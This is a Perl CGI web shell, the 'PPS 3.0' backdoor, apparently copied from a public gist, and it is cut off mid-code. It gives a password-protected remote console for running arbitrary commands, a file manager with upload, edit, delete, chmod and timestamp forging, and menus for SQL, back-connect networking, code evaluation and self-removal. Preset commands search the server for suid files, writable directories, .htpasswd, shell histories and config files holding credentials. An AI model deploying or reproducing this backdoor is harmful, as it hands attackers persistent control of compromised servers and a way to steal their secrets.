##
## https://gist.githubusercontent.com/jonaslejon/1f1e56855cce117751ca/raw/a037d6b048d05a0b408addc974da22d0a972f455/cgi.pl
##

#!/usr/bin/perl

##
##

#PPS 3.0 shell by Pashkela [RDOT.ORG] © 2012
$Password="bb09c55983ff49f3a9cdfd83f08e5689";# root
$CommandTimeoutDuration=30;# max time of command execution
$tab='<table>';$tbb="<table width=100%";$verd="<font face=Verdana size=1>";$tabe='</table>';$div='<div class=content><pre class=ml1>';$dive='</pre></div>';use Digest::MD5 qw(md5_hex
);$WinNT=0;$NTCmdSep="&";$UnixCmdSep=";";$ShowDynamicOutput=1;$CmdSep=($WinNT?$NTCmdSep:$UnixCmdSep);$CmdPwd=($WinNT?"cd":"pwd");$PathSep=($WinNT?"\\":"/");$Redirector=($WinNT?" 2>&
1 1>&2":" 1>&1 2>&1");$LogFlag=false;use File::Basename;use MIME::Base64;my @last:shared;sub cod($){my $url=~s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;$url=encode_base64($_[0]);return
 $url;}sub dec($){ my $url1=decode_base64($_[0]);return $url1;}sub ReadParse {local (*in)=@_ if @_;local($i,$loc,$key,$val);$MultipartFormData=$ENV{'CONTENT_TYPE'}=~/multipart\/form
-data; boundary=(.+)$/;if($ENV{'REQUEST_METHOD'} eq "GET"){$in=$ENV{'QUERY_STRING'};}elsif($ENV{'REQUEST_METHOD'} eq "POST"){binmode(STDIN) if $MultipartFormData & $WinNT;read(STDIN
,$in,$ENV{'CONTENT_LENGTH'});}if($ENV{'CONTENT_TYPE'}=~/multipart\/form-data; boundary=(.+)$/){$Boundary='--'.$1;@list=split(/$Boundary/,$in);$HeaderBody=$list[1];$HeaderBody=~/\r\n
\r\n|\n\n/;$Header=$`;$Body=$';$Body=~s/\r\n$//;$in{'filedata'}=$Body;$Header=~/filename=\"(.+)\"/;$in{'f'}=$1;for($i=2;$list[$i];$i++){$list[$i]=~s/^.+name=$//;$list[$i]=~/\"(\w+)\
"/;$key=$1;$val=$';$val=~s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;$val=~s/%(..)/pack("c",hex($1))/ge;$in{$key}=$val;}}else{@in=split(/&/,$in);foreach $i(0 .. $#in){$in[$i]=~s/\+/ /g;($ke
y,$val)=split(/=/,$in[$i],2);$key=~s/%(..)/pack("c",hex($1))/ge;$val=~s/%(..)/pack("c",hex($1))/ge;$in{$key}.="\0" if(defined($in{$key}));$in{$key}.=$val;}}}sub uname{$s="uname -a";
$s.=" -U $q{u}" if($q{u});return $s;}sub hddall{$s='df -k /|sed 1d|awk "{total += \$2} {print total/1024/1024}"';$s.=" -U $q{u}" if($q{u});return $s;}sub hddfree{$s='df -k /|sed 1d|
awk "{total += \$4} {print total/1024/1024}"';$s.=" -U $q{u}" if($q{u});return $s;}sub hddproc{$s='df -k /| sed 1d | awk "{total += \$5} {print 100-total}"';$s.=" -U $q{u}" if($q{u}
);return $s;}$hddall=hddall();$hddfree=hddfree();$hddproc=hddproc();sub PH{printf ("%.2f",(@_))};sub id{$s="id";$s.=" -U $q{u}" if($q{u});return $s;}sub dir_read($){if(!-r $_[0]||$_
[0]=~m/\"/gis||$_[0]=~m/\s/gis||$_[0]=~m/\(/gis||$_[0]=~m/\)/gis){return "# Can't read $_[0]!";}else{$_[0]=~s/\/\//\//g;return "cd ".$_[0];}}sub dlink($){if(-l $_[0]){return '->'.re
adlink $_[0]}}sub dir_list{my @list=();$CurrentDir=~s!\Q//!/!g;my $dir=$CurrentDir;@list=scan_dir($dir);$id=0;foreach $arg(@list){$id++;$ii='d'.$id;my $name=fileparse($arg,@suffixli
st);if(-d $arg){print '<tr class='.($id%2==0?"l1":"l2").'><th class=chkbx><input type=checkbox class=chkbx name=lo></th><td><form method=POST name='.$ii.'><input type=hidden name=a
value=command><input type=hidden name=d value='.$CurrentDir.'><input type=hidden name=c value="'.dir_read($arg).'"><a href="javascript:document.'.$ii.'.submit()"><font face="Verdana
" size="2">&nbsp;<b>[ '.$name.dlink($arg).' ]</b></font></a></form></td><td>dir</td><td>'.mt1((stat($arg))[9]).'</td>'.owner($arg).'<td>'.$tab.'<td><form name='.$ii.'rt method="POST
"><input type="hidden" name="d" value="'.$CurrentDir.'"><input type="hidden" name="a" value="RT"><input type="hidden" name="fdata" value='.cod(mt1((stat($arg))[9])).'><input type="h
idden" name="fchmod" value='.perm($arg).'><input type="hidden" name="f" value='.$name.'><a href="javascript:document.'.$ii.'rt.submit()">R T </a></form></td><td><form method=POST na
me='.$ii.'z><input type=hidden name=zip value='.$name.'><input type=hidden name=arh_name value='.$ii.'z><input type=hidden name=a value=command><input type=hidden name=d value='.$Cu
rrentDir.'><input type=hidden name=c value=zip><a href="javascript:document.'.$ii.'z.submit()">[zip]</a></form></td><td><form method=POST name='.$ii.'uz><input type=hidden name=unzi
p_name value='.$name.'><input type=hidden name=a value=command><input type=hidden name=d value='.$CurrentDir.'><input type=hidden name=c value=unzip><a href="javascript:document.'.$
ii.'uz.submit()">[unzip]</a></form></td><td><form method=POST name='.$ii.'del><input type=hidden name=del_dir value='.$name.'><input type=hidden name=a value=command><input type=hid
den name=d value='.$CurrentDir.'><input type=hidden name=c value=deldir><a href="javascript:document.'.$ii.'del.submit()">[<font color=#FF0000>x</font>]</a></form></td></table/></td
></tr>';}else{$size1=(stat $arg)[7]/1024;if($size1<1000){$size=sprintf("%.2f",($size1))." KB";}else{$size=sprintf("%.2f",($size1/1024))." MB";}print '<tr class='.($id%2==0?"l1":"l2"
).'><th class=chkbx><input type=checkbox class=chkbx name=lo></th><td><form name='.$ii.' method=post><input type=hidden name=path id=view value='.$name.'><input type=hidden name=a v
alue=view_file><input type=hidden name=d value='.$CurrentDir.'><a href="javascript:document.'.$ii.'.submit()"><font face="Verdana" size="2">&nbsp;'.$name.dlink($arg).'</font></a></f
orm></td><td>'.$size.'</td><td>'.mt1((stat($arg))[9]).'</td>'.owner($arg).'<td>'.$tab.'<td><form name='.$ii.'rt method="POST"><input type="hidden" name="d" value="'.$CurrentDir.'"><
input type="hidden" name="a" value="RT"><input type="hidden" name="fdata" value='.cod(mt1((stat($arg))[9])).'><input type="hidden" name="fchmod" value='.perm($arg).'><input type="hi
dden" name="f" value='.$name.'><a href="javascript:document.'.$ii.'rt.submit()">R T </a></form></td><td><form name='.$ii.'ed method=post><input type=hidden name=path id=edit1_file v
alue='.$name.'><input type=hidden name=a value=edit_file_path><input type=hidden name=d value='.$CurrentDir.'><a href="javascript:document.'.$ii.'ed.submit()">E </a></form></td><td>
<form name='.$ii.'d method="POST"><input type="hidden" name="d" value="'.$CurrentDir.'"><input type="hidden" name="a" value="download"><input type="hidden" name="f" value='.$name.'>
<a href="javascript:document.'.$ii.'d.submit()">D </a></form></td><td><form method=POST name='.$ii.'z><input type=hidden name=zip value='.$name.'><input type=hidden name=arh_name va
lue='.$ii.'z><input type=hidden name=a value=command><input type=hidden name=d value='.$CurrentDir.'><input type=hidden name=c value=zip><a href="javascript:document.'.$ii.'z.submit
()">[zip]</a></form></td><td><form method=POST name='.$ii.'uz><input type=hidden name=unzip_name value='.$name.'><input type=hidden name=a value=command><input type=hidden name=d va
lue='.$CurrentDir.'><input type=hidden name=c value=unzip><a href="javascript:document.'.$ii.'uz.submit()">[unzip]</a></form></td><td><form method=POST name='.$ii.'del><input type=h
idden name=del_file value='.$name.'><input type=hidden name=a value=command><input type=hidden name=d value='.$CurrentDir.'><input type=hidden name=c value=delfile><a href="javascri
pt:document.'.$ii.'del.submit()">[<font color=#FF0000>x</font>]</a></form></td>'.$tabe.'</td></tr>'}}print $tabe;sub perm($){my $mode=sprintf("%04o",((stat($_[0]))[2])&07777);return
 $mode;}sub owner($){my $uid=(stat $_[0])[4];my $user=(getpwuid $uid)[0];my $uid1=(stat $_[0])[5];my $group=(getgrgid $uid1)[0];my $mode=sprintf("%04o",((stat($_[0]))[2])&07777);my
$suid=substr $mode,0,1;my $last=substr $mode,1;if($suid==4||$suid==6||$suid==2){if(!-r $_[0]){return '<td>'.$user.'/'.$group.'</td><td><b><font color=#FFD700>'.$suid.'</font></b><fo
nt color=#FF0000>'.$last.'</font></td>';}elsif(!-w $_[0]){return '<td>'.$user.'/'.$group.'</td><td><b><font color=#FFD700>'.$suid.'</font></b><font color=#FFFFFF>'.$last.'</font></t
d>';}else{return '<td>'.$user.'/'.$group.'</td><td><b><font color=#FFD700>'.$suid.'</font></b><font color=#25ff00>'.$last.'</font></td>';}}else{if(!-r $_[0]){return '<td>'.$user.'/'
.$group.'</td><td><font color=#FF0000>'.$mode.'</font></td>';}elsif(!-w $_[0]){return '<td>'.$user.'/'.$group.'</td><td><font color=#FFFFFF>'.$mode.'</font></td>';}else{return '<td>
'.$user.'/'.$group.'</td><td><font color=#25ff00>'.$mode.'</font></td>';}}}sub mt{my($seconds,$minutes,$hours,$day,$month,$year,$wday,$yday,$isdst)=localtime();my $mmtime=($year+190
0).'-'.sprintf("%02d",($month+1)).'-'.sprintf("%02d",$day).' '.sprintf("%02d",$hours).':'.sprintf("%02d",$minutes).':'.sprintf("%02d",$seconds);return $mmtime;}sub mt1($){my($second
s,$minutes,$hours,$day,$month,$year,$wday,$yday,$isdst)=localtime($_[0]);my $mmtime=($year+1900).'-'.sprintf("%02d",($month+1)).'-'.sprintf("%02d",$day).' '.sprintf("%02d",$hours).'
:'.sprintf("%02d",$minutes).':'.sprintf("%02d",$seconds);return $mmtime;}sub scan_dir{my ($dir)=@_;my @dirs=();my @files=();my @list=();my @file=();for $file (glob($dir.'/.*')){if(-
d $file && $file ne $dir.'/.'){push @dirs,$file;}if(-f $file){push @files,$file;}}for $file (glob($dir.'/*')){if(-d $file) {push @dirs,$file;}else{push @files,$file;}}@list=(@dirs,@
files);return @list;}}sub HtmlSpecialChars($){my ($st)=@_;$st=~s|<|< |g;$st=~s|>| >|g;return $st;}sub DeHtmlSpecialChars($){my ($st)=@_;$st=~s|< |<|g;$st=~s| >|>|g;return $st;}
$uname = uname();$idd = id();sub P{print @_}sub PrintPageHeader{print "Content-type: text/html\n\n";&GetCookies;$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;if($LoggedIn != 1) {$Pa
ssword = 0}$EncodedCurrentDir = $CurrentDir;$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;print <<END;
<html><head><title>PPS 3.0</title>$HtmlMetaHeader<style>body{background-color:#444;color:#e1e1e1;font: 9pt Monospace,'Courier New';text-decoration:none;}body,td,th{font: 9pt Lucida,
Verdana;margin:0;vertical-align:top;color:#e1e1e1;}table.info{color:#fff;background-color:#222;}span,h1,a{color: #df5 !important;}span{font-weight: bolder;}h1{border-left:5px solid
#df5;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px;}div.content{padding: 5px;margin-left:5px;background-color:#333;font: 9pt Monospace,'Courier New';}a{text-d
ecoration:none;}a:hover{text-decoration:underline;}.ml1{border:1px solid#444;font:9pt Monospace,'Courier New';color:#e1e1e1;padding:5px;margin:0;overflow:auto;}.bigarea{width:100%;h
eight:250px;}input,textarea,select{margin:0;color:#fff;background-color:#555;border:1px solid #df5;font: 9pt Monospace,'Courier New';}form{margin:0px;}#toolsTbl{text-align:center;}.
toolsInp{width: 300px}.toolsInp1{border: none}.main th{text-align:left;background-color:#5e5e5e;}.main tr:hover{background-color:#5e5e5e}.l1{background-color:#444}.l2{background-col
or:#333}pre{font-family:Courier,Monospace;}</style></head><body onLoad="changeText();document.checkbox.@_.focus()" bgcolor="#000000" topmargin="0" leftmargin="0" marginwidth="0" mar
ginheight="0"><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Hdd:<br>DateTime:<br>Pwd:</span></td><td><nobr>
END
P(`$uname`);print "</nobr><br>";P(`$idd`);print "<br>";PH(`$hddall`);print " GB <span>Free: </span>";PH(`$hddfree`);print " GB [ ";P(`$hddproc`);print "% ]";$time=mt();print "<br>$t
ime$tab <td>";my $cwd="";my @path=split("/",$CurrentDir);my $mode=sprintf("%04o",((stat($CurrentDir))[2])&07777);my $ss=0;print '<table cellpadding=0 cellspacing=0><td><form method=
POST name=cwd0><a href="javascript:document.cwd0.submit()">[..]&nbsp;</a><input type=hidden name=cc value="/"><input type=hidden name=a value=command><input type=hidden name=d value
='.$CurrentDir.'><input type=hidden name=c value="changedir"></form></td>';foreach my $ar(@path){if($ar){$cwd .= "/".$ar;$ss++;print '<td><form method=POST name=cwd'.$ss.'><a href="
javascript:document.cwd'.$ss.'.submit()">/'.$ar.'</a><input type=hidden name=cc value='.$cwd.'><input type=hidden name=a value=command><input type=hidden name=d value='.$CurrentDir.
'><input type=hidden name=c value="changedir"></form></td>';}}my $fw="<font face=Verdana size=2 color=#FFFFFF>";my $fe="</font>";print $tabe;sub cwdcol{if(!-r $CurrentDir){return '<
font color=#FF0000>'.$mode.'</font>';}elsif(!-w $CurrentDir){return '<font color=#FFFFFF>'.$mode.'</font>';}else{return '<font color=#25ff00>'.$mode.'</font>';}}print "<td>".cwdcol(
)."</td><td><a href=$ScriptLocation> [ home ] </a></td></td>$tabe";print <<END;
</td><td width=1 align=right><nobr><span>Server IP:</span><br>$ENV{'SERVER_ADDR'}<br><span>Client IP:</span><br>$ENV{'REMOTE_ADDR'}</nobr></td></tr>$tabe<table width=100% bgcolor=#4
44><td><form method="POST" name=systeminfo><input type="hidden" name="a" value="systeminfo"><input type=hidden name=d value=$CurrentDir><a href="javascript:document.systeminfo.submi
t()">$fw [ $fe Sysinfo $fw ] $fe</a></form></td><td><form method=POST name=files><input type=hidden name=cc value=$CurrentDir><a href="javascript:document.files.submit()">$fw [ $fe
Files $fw ] $fe</a><input type=hidden name=a value=command><input type=hidden name=d value=$CurrentDir><input type=hidden name=c value="cd $CurrentDir"></form></td><td><form method=
"POST" name=consoler><input type="hidden" name="a" value="console"><input type="hidden" name="d" value=$CurrentDir><a href="javascript:document.consoler.submit()"> $fw [ $fe Console
 $fw ] $fe</a></form></td><td><form method="POST" name=sqlman><input type=hidden name=d value=$CurrentDir><input type="hidden" name="a" value="sql"><a href="javascript:document.sqlm
an.submit()">$fw [ $fe SQL $fw ] $fe</a></form></td><td><form method="POST" name=backconn><input type=hidden name=d value=$CurrentDir><input type="hidden" name="a" value="net"><a hr
ef="javascript:document.backconn.submit()">$fw [ $fe Network $fw ] $fe</a></form></td><td><form method="POST" name=evalc><input type=hidden name=d value=$CurrentDir><input type="hid
den" name="a" value="code"><a href="javascript:document.evalc.submit()">$fw [ $fe Code $fw ] $fe</a></form></td><td><form method="POST" name=logout><input type="hidden" name="a" val
ue="logout"><a href="javascript:document.logout.submit()">$fw [ $fe Logout $fw ] $fe</a></form></td><td><form method="POST" name=remove><input type="hidden" name="a" value="remove">
<a href="javascript:document.remove.submit()">$fw [ $fe Self remove $fw ] $fe</a></form></td>$tabe</tr>$tabe<font color="#C0C0C0" size="2">
END
}sub PrintLoginForm{print "<center><form name=f method=POST><input type=password name=p><input type=submit value='>>'></form></center>";}sub PrintPageFooter{print "</font></body></h
tml>";}sub GetCookies{@httpcookies=split(/; /,$ENV{'HTTP_COOKIE'});foreach $cookie(@httpcookies){($id,$val)=split(/=/,$cookie);$Cookies{$id}=$val;}}sub PerformLogout{print "Set-Cook
ie: SAVEDPWD=;\n;Set-Cookie: last_command=;\n";print "Content-type: text/html\n\n";&PrintLoginForm;}sub PerformLogin{if(md5_hex($LoginPassword) eq $Password){print "Set-Cookie: SAVE
DPWD=".md5_hex($LoginPassword).";\n";&PrintPageHeader("c");file_header();&PrintCommandLineInputForm;&PrintPageFooter;}else{print "Content-type: text/html\n\n";&PrintLoginForm;}}sub
FileManager{&PrintPageHeader("f");file_header();&PrintCommandLineInputForm;&PrintPageFooter;}sub PrintCommandLineInputForm{$Prompt = $WinNT ? "$CurrentDir> " : "[$ServerName $Curren
tDir]\$ ";dir_list();print "<tr><form method=post><input type=hidden name=a value=command><input type=hidden name=d value=$CurrentDir><select name=group><option value=delete>Delete<
/option><option value=tar>Compress [tar.gz]</option><option value=untar>Uncompress [tar.gz]</option></select><input type=submit value='>>' onclick='validate()'></tr></form>$dive";su
b wr_cur {if(!-w $CurrentDir){print '<font color=#FF0000>[Not writable]</font>';}else{print '<font color=#25ff00>[Writeable]</font>';}}sub PrintVar{print <<END;
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'><tr><td><form method=POST><span>Change dir:</sp
an><br><input class=toolsInp type=text name=cc value=$CurrentDir><input type=submit value='>>'><input type=hidden name=a value=command><input type=hidden name=d value=$CurrentDir><i
nput type=hidden name=c value="changedir"></form></td><td><form method=POST><span>Read file:</span><br><input class='toolsInp' type=text name=path><input type=hidden name=a value=vi
ew_file><input type=hidden name=d value=$CurrentDir><input type=submit value='>>'></form></td></tr><tr><td><form method=POST><span>Make dir:</span>
END
wr_cur();print <<END;
<br><input class='toolsInp' type=text name=md><input type=hidden name=a value=command><input type=hidden name=d value=$CurrentDir><input type=hidden name=c value="makedir"><input ty
pe=submit value='>>'></form></td><td><form method=POST><span>Make file:</span>
END
wr_cur();print <<END;
<br><input class='toolsInp' type=text name=mf><input type=hidden name=a value=command><input type=hidden name=d value=$CurrentDir><input type=hidden name=c value="makefile"><input t
ype=submit value='>>'></form></td></tr><tr><td><form name="ff" method="POST"><span>Execute:</span><br><input type="hidden" name="a" value="command"><input type="hidden" name="d" val
ue="$CurrentDir"><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
<td>
END
&PrintFileUploadForm;print <<END;
</td>$tabe
END
}sub PrintFileUploadForm{print <<END;
<span>Upload file: </span>
END
wr_cur();print <<END;
<br><form name="upload_file_form" enctype="multipart/form-data" method="POST"><input type="file" name="f" class=toolsInp><input type="submit" value=">>"><input type="hidden" name="d
" value="$CurrentDir"><input type="hidden" name="a" value="upload"></form><script>function setCookie(name,value,expires,path,domain,secure){document.cookie=name+"="+escape(value)+((
expires)?";expires="+expires:"")+((path)?";path="+path:"")+((domain)?";domain="+domain:"")+((secure)?";secure":"");}function validate(form){var namelist='';var names=document.getEle
mentsByName('lo');  var lo=document.getElementsByName('zip');for(var i=0;i<names.length;i++){if(names[i].checked){namelist+=lo[i].value+' ';}}setCookie("f",namelist,"","/");}functio
n sall(form){var namelist='';var ch=true;var names=document.getElementsByName('lo');var ss=document.getElementsByName('ch11');if(ss[0].checked){ch=true;}else{ch=false;}for(var i=0;i
<names.length;i++){names[i].checked=ch;}}</script>
END
}&PrintVar;}sub ah($){(my $str=shift)=~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;return $str;}sub ha($){(my $str=shift)=~s/([a-fA-F0-9]{2})/chr(hex $1)/eg;return $str;}sub ConsoleP{prin
t <<END;
<tr><td><form name="run" method="POST"><br><input type=text size="2" id="sub3" disabled value='\$ '><input type="hidden" name="a" value="command1"><input type="hidden" name="d" valu
e="$CurrentDir"><input type=text name="c" size=100 class=toolsInp1 id='lsname' onkeypress="s(event)" value=''><input type=submit class=toolsInp1 id="sub4" value=''></form></td></tr>
$tab<td><form name="alias" method="POST"><br><input type="hidden" name="a" value="command1"><input type="hidden" name="d" value="$CurrentDir"><select name=aliases id='nnname' class=
toolsInp><option value="ls -lha">List dir</option><option value="lsattr -va">list file attributes on a Linux second extended file system</option><option value="netstat -an | grep -i
 listen">show opened ports</option><option value="ps aux">process status</option><optgroup label="-Find-"></optgroup><option value="find / -type f -perm -04000 -ls">find all suid fi
les</option><option value="find . -type f -perm -04000 -ls">find suid files in current dir</option><option value="find / -type f -perm -02000 -ls">find all sgid files</option><optio
n value="find . -type f -perm -02000 -ls">find sgid files in current dir</option><option value="find / -type f -name config.inc.php">find config.inc.php files</option><option value=
"find / -type f -name &quot;config*&quot;">find config* files</option><option value="find . -type f -name &quot;config*&quot;">find config* files in current dir</option><option valu
e="find / -perm -2 -ls">find all writable folders and files</option><option value="find . -perm -2 -ls">find all writable folders and files in current dir</option><option value="fin
d / -type f -name service.pwd">find all service.pwd files</option><option value="find . -type f -name service.pwd">find service.pwd files in current dir</option><option value="find
/ -type f -name .htpasswd">find all .htpasswd files</option><option value="find . -type f -name .htpasswd">find .htpasswd files in current dir</option><option value="find / -type f
-name .bash_history">find all .bash_history files</option><option value="find . -type f -name .bash_history">find .bash_history files in current dir</option><option value="find / -t
ype f -name .fetchmailrc">find all .fetchmailrc files</option><option value="find . -type f -name .fetchmailrc">find .fetchmailrc files in current dir</option><optgroup label="-Loca
te-"></optgroup><option value="locate httpd.conf">locate httpd.conf files</option><option value="locate vhosts.conf">locate vhosts.conf files</option><option value="locate proftpd.c
onf">locate proftpd.conf files</option><option value="locate psybnc.conf">locate psybnc.conf files</option><option value="locate my.conf">locate my.conf files</option><option value=
"locate admin.php">locate admin.php files</option><option value="locate cfg.php">locate cfg.php files</option><option value="locate conf.php">locate conf.php files</option><option v
alue="locate config.dat">locate config.dat files</option><option value="locate config.php">locate config.php files</option><option value="locate config.inc">locate config.inc files<
/option><option value="locate config.inc.php">locate config.inc.php</option><option value="locate config.default.php">locate config.default.php files</option><option value="locate c
onfig">locate config* files </option><option value="locate '.conf'">locate .conf files</option><option value="locate '.pwd'">locate .pwd files</option><option value="locate '.sql'">
locate .sql files</option><option value="locate '.htpasswd'">locate .htpasswd files</option><option value="locate '.bash_history'">locate .bash_history files</option><option value="
locate '.mysql_history'">locate .mysql_history files</option><option value="locate '.fetchmailrc'">locate .fetchmailrc files</option><option value="locate backup">locate backup file
s</option><option value="locate dump">locate dump files</option><option value="locate priv">locate priv files</option></select><input type=submit id="sub2" value='>>'></form></td><t
d><form name="l11" method="POST"><br><input type="hidden" name="a" value="command1"><input type="hidden" name="d" value="$CurrentDir"><select name=l11 id='l11' class=toolsInp>
END
print "<option value=".$last[-1].">".$last[-1]."</option>";foreach $arg(@last){print "<option value=\"$arg\">$arg</option>";}print <<END;
</select><input type=submit id="sub5" value='>>'></form></td>$tabe<script>document.getElementById('sub3').style.borderColor='#444';document.getElementById('sub2').style.borderColor=
'#333';document.getElementById('lsname').style.borderColor='#333';document.getElementById('nnname').style.borderColor='#333';document.getElementById('sub4').style.borderColor='#333'
;document.getElementById("lsname").style.backgroundColor='#333';document.getElementById("l11").style.backgroundColor='#4444';document.getElementById("sub5").style.backgroundColor='#
444';document.getElementById('l11').style.borderColor='#444';document.getElementById('sub5').style.borderColor='#444';document.getElementById("sub3").style.backgroundColor='#333';do
cument.getElementById("sub3").style.borderColor='#333';document.getElementById("sub4").style.backgroundColor='#333';document.getElementById('lsname').focus();
function s(e){window.scrollTo(0,document.body.scrollHeight);var u=e.keyCode?e.keyCode:e.charCode;var x=document.getElementById("l11").selectedIndex;var y=document.getElementById("l1
1").options;if(u==38){t=y[x+1].text;document.getElementById("lsname").value=t;document.getElementById("l11").selectedIndex=document.getElementById("l11").selectedIndex+1;}if(u==40){
t=y[x-1].text;document.getElementById("lsname").value=t;document.getElementById("l11").selectedIndex=document.getElementById("l11").selectedIndex-1;}}</script>$dive
END
&PrintVar;}sub ft($){my $Fchmod=perm($_[0]);my $owner=owner($_[0]);if(!-w $_[0]){$wr='<font color=#FF0000>  Not writable</font>'}else{$wr='<font color=#25ff00>  Writeable</font>'}my
 $time=mt1((stat($_[0]))[8]);sub ffs{return '<font color=#df5>'}sub ffe{return '</font>'}$ffs=ffs();$ffe=ffe();$size1=(stat $_[0])[7]/1024;if($size1<1000){$size=sprintf("%.2f",($siz
e1))." KB";}else{$size=sprintf("%.2f",($size1/1024))." MB"}my $ctime=mt1((stat($_[0]))[10]);my $motime=mt1((stat($_[0]))[9]);print "<div class=content>$tab<td><b>$ffs Name: $ffe</b>
$TransferFile</td><td><b>$ffs Size: $ffe</b>$size</td><td><b>$ffs Permission: $ffe</b>$owner</td><td><b>$ffs Access time: $ffe</b>$time</td>$tabe$tab<td><b>$ffs Create time: $ffe</b
>$ctime</td><td><b>$ffs Modify time: $ffe</b>$motime</td><td>$wr$tabe</td><table id=toolsTbl cellpadding=0 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2
px solid #333;'><td><table cellpadding=3 cellspacing=3><tr><td><form name=run method=POST><input type=hidden name=a value=command><input type=hidden name=d value=$CurrentDir><input
type=hidden name=c value=rename_file><input type=hidden name=path value=".$_[0]."><input type=text size=20 name=rename_file value=$TransferFile><input type=submit value=RENAME></for
m></td><td><form name=run method=POST><input type=hidden name=a value=command><input type=hidden name=d value=$CurrentDir><input type=hidden name=c value=touch_file><input type=hidd
en name=path value=".$_[0]."><input type=text size=20 name=touch_file value='$motime'><input type=submit value=TOUCH></form></td><td><form name=run method=POST><input type=hidden na
me=a value=command><input type=hidden name=d value=$CurrentDir><input type=text size=20 name=chmod value=$Fchmod><input type=hidden name=path value=".$_[0]."><input type=hidden name
=c value=chmod_file><input type=submit value=CHMOD></form></td><td><form name=run method=POST><input type=hidden name=a value=download><input type=hidden name=f value=$TransferFile>
<input type=hidden name=d value=$CurrentDir><input type=hidden name=path value=$TransferFile><input type=submit value=DOWNLOAD></form></td><td><form name=run method=POST><input type
=hidden name=a value=view_file><input type=hidden name=d value=$CurrentDir><input type=hidden name=path value=$TransferFile><input type=submit value=VIEW></form></td><td><form name=
run method=POST><input type=hidden name=a value=edit_file_path><input type=hidden name=d value=$CurrentDir><input type=hidden name=path value=$TransferFile><input type=submit value=
EDIT></form></td>$tabe</td>$tabe</div>";}sub RTP_EDIT{$TransferFile=$ViewF;my $path=$CurrentDir."/".$TransferFile;ft($path);}sub RT{&PrintPageHeader;print "<h1>File operations:</h1>
";my $path=$CurrentDir."/".$TransferFile;ft($path);&PrintVar;&PrintPageFooter;}sub Console{&PrintPageHeader;print "<h1>Console:</h1>";print "$div<font style=\"font:9pt Monospace,'Co
urier New';\">";$Prompt="[$ServerName $CurrentDir]";print "$Prompt</font>";ConsoleP();&PrintPageFooter;}sub CommandTimeout{if(!$WinNT){alarm(0);print "</xmp>Command exceeded maximum
 time of$CommandTimeoutDuration second(s).<br>Killed it!";ConsoleP();exit;}}sub file_header{print "<h1>File manager</h1>$div<table width=100% class=main cellspacing=0 cellpadding=0>
<tr><th width='13px'><input type=checkbox class=chkbx name=ch11 onclick='sall()'></th><th>&nbsp;Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Acti
ons</th></tr>";}sub history{&GetCookies;my $h=$Cookies{'last_command'};my $x=length $h;$h=ha $h;if($x<3500){$h.=$RunCommand."ussr"}else{$h=$RunCommand."ussr"}@last=split(/ussr/,$h);
$h=ah $h;print <<END;
<script>function setCookie(name,value,expires,path,domain,secure){document.cookie=name+"="+escape(value)+((expires)?";expires="+expires:"")+((path)?";path="+path:"")+((domain)?";dom
ain="+domain:"")+((secure)?";secure":"");}setCookie("last_command","$h","","/");</script>
END
}sub ExecuteCommand1{if($RunCommand =~ m/^\s*cd\s+(.+)/gis){$CurrentDir=~s!\Q//!/!g;if(!-r $1){$RunCommand="Can't read $1!";chop($CurrentDir=`$Command`)}else{$OldDir=$CurrentDir;$Co
mmand="cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;chop($CurrentDir=`$Command`)}&PrintPageHeader("c");print "<h1>Console:</h1>$div";$Prompt = $WinNT ? "$OldDir> " : "[$Serve
rName $OldDir]\$ ";print "$Prompt $RunCommand";}else{&PrintPageHeader("c");&history;print "<h1>Console:</h1>$div";$Prompt = $WinNT ? "$CurrentDir> " : "[$ServerName $CurrentDir]\$ "
;print "$Prompt $RunCommand<pre>";$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;if(!$WinNT){$SIG{'ALRM'}=\&CommandTimeout;alarm($CommandTimeoutDuration);}if($ShowD
ynamicOutput){$|=1;$Command .= " |";open(CommandOutput, $Command);while(<CommandOutput>){$_=~s/(\n|\r\n)$//;print "$_\n";}$|=0;}else{print `$Command`;}if(!$WinNT){alarm(0);}print "<
/pre>";}ConsoleP();&PrintPageFooter;}sub ExecuteCommand{my $path=$in{'path'};$CurrentDir=$in{'d'};$CurrentDir=~s!\Q//!/!g;if($RunCommand eq "changedir"){$RunCommand="cd $ChangeDir";
}elsif($RunCommand eq "makedir"){$RunCommand="mkdir $MkDir";}elsif($RunCommand eq "makefile"){$RunCommand="touch $MakeFile";}elsif($RunCommand eq "zip"){$RunCommand="tar cfz ".$ZipA
rch.".tar.gz ".$ZipFile;}elsif($RunCommand eq "unzip"){$RunCommand="tar xfz ".$UnZipArch;}elsif($RunCommand eq "delfile"){$RunCommand="rm ".$DelFile;}elsif($RunCommand eq "deldir"){
$RunCommand = "rm -rf ".$DelDir;}elsif($RunCommand eq "chmod_file"){my $tempt=$in{'chmod'};$RunCommand="chmod $tempt $path";}elsif($RunCommand eq "rename_file"){my $rtempt=$in{'rena
me_file'};$RunCommand="mv $path $CurrentDir/$rtempt";}elsif($RunCommand eq "touch_file"){my $ttempt=$in{'touch_file'};$ttempt=~s!\Q-!!g;$ttempt=~s!\Q:!!g;$ttempt=~s/ //g;my $ar=subs
tr($ttempt,12);my $al=substr($ttempt,0,12);$ttempt=$al.".".$ar;$RunCommand="touch -t $ttempt $path";}if($RunCommand=~m/^\s*cd\s+(.+)/){$OldDir=$CurrentDir;$Command="cd \"$CurrentDir
\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;chop($CurrentDir=`$Command`);&PrintPageHeader("c");file_header();print "<font size=1>";$Prompt=$WinNT?"$OldDir> " : "[$ServerName $OldDir]\$ ";pr
int "$Prompt $RunCommand";}else{&PrintPageHeader("c");file_header();print "<font size=1>";$Prompt=$WinNT?"$CurrentDir> " : "[$ServerName $CurrentDir]\$ ";print "$Prompt $RunCommand<
